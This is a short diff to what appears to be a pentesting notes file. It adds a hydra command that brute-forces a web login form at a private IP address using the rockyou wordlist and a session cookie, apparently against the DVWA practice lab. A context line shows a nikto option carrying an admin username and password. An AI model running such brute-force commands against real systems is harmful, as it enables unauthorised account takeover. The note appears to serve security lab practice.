@@ -1,3 +1,7 @@
+### hydra
+```
+ hydra 192.168.231.110 -l admin -P /usr/share/wordlists/rockyou.txt http-get-form “/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:PHPSESSID=3jr86cmf45oen0ggigm630fstu; security=low”
+ ```
 ### nikto 
 ```
 -id admin:PrettyAwesomePassword1234
